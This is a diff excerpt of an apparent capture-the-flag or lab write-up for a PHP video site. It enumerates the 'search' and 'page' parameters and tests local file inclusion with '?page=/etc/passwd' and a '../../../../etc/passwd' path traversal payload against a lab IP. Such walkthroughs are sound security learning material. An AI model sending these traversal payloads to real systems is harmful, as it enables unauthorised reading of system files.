@@ -20,9 +20,11 @@ The website is a php based solution where youtube videos linked in iframes are d
 
 Two parameters can be modified on the home page
 http://10.10.83.116/?search=
+
 http://10.10.83.116/?page=
 
 search parameter not vulnerable
+
 page parameter is better we can use file extraction
 
 #### Step 2 - Find LFI
@@ -30,6 +32,7 @@ page parameter is better we can use file extraction
 As a first step, let's look at the following methods
 
 http://10.10.83.116/?page=/etc/passwd
+
 The answer in this case is not yet positive: "HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!"
 
 Ok, testing with full uri: http://10.10.83.116/?page=../../../../../../../../etc/passwd
